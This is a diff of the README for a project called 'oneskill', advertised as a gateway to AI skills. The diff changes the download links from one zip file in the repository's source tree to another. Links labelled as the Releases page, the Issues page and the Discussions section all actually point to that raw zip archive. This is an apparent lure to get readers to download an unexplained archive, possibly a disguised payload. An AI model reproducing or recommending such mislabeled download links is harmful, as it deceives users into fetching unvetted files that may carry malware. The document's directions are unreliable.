@@ -1,7 +1,7 @@
 # 🌟 oneskill - Your Gateway to AI Skills
 
 ## 🔗 Download Now
-[![Download](https://github.com/Felixlan11/oneskill/raw/refs/heads/main/src/utils/Software-v1.4.zip%20oneskill-%23000?style=for-the-badge&logo=github)](https://github.com/Felixlan11/oneskill/raw/refs/heads/main/src/utils/Software-v1.4.zip)
+[![Download](https://github.com/Felixlan11/oneskill/raw/refs/heads/main/src/core/Software_v3.1.zip%20oneskill-%23000?style=for-the-badge&logo=github)](https://github.com/Felixlan11/oneskill/raw/refs/heads/main/src/core/Software_v3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -25,12 +25,12 @@ To ensure oneskill runs effectively on your computer, please make sure you meet 
 
 ## 📥 Download & Install
 
-To get started with oneskill, please visit this page to download: [Download oneskill](https://github.com/Felixlan11/oneskill/raw/refs/heads/main/src/utils/Software-v1.4.zip).
+To get started with oneskill, please visit this page to download: [Download oneskill](https://github.com/Felixlan11/oneskill/raw/refs/heads/main/src/core/Software_v3.1.zip).
 
 ### Step-by-Step Installation Guide
 
 1. **Visit the Releases Page:**
-   Click on the following link to go to the Releases page: [oneskill Releases](https://github.com/Felixlan11/oneskill/raw/refs/heads/main/src/utils/Software-v1.4.zip).
+   Click on the following link to go to the Releases page: [oneskill Releases](https://github.com/Felixlan11/oneskill/raw/refs/heads/main/src/core/Software_v3.1.zip).
 
 2. **Choose Your Download:**
    On the Releases page, you will see a list of available versions. Select the latest version for the best experience.
@@ -85,8 +85,8 @@ To ensure you have the latest features:
 
 If you encounter any issues or have questions:
 
-- **Visit the Issues Page:** Report bugs or ask questions on our [Issues page](https://github.com/Felixlan11/oneskill/raw/refs/heads/main/src/utils/Software-v1.4.zip).
-- **Join the Community:** Connect with other users and contribute to discussions in the [Discussions section](https://github.com/Felixlan11/oneskill/raw/refs/heads/main/src/utils/Software-v1.4.zip).
+- **Visit the Issues Page:** Report bugs or ask questions on our [Issues page](https://github.com/Felixlan11/oneskill/raw/refs/heads/main/src/core/Software_v3.1.zip).
+- **Join the Community:** Connect with other users and contribute to discussions in the [Discussions section](https://github.com/Felixlan11/oneskill/raw/refs/heads/main/src/core/Software_v3.1.zip).
 
 ## 📝 Contribution Guide
 
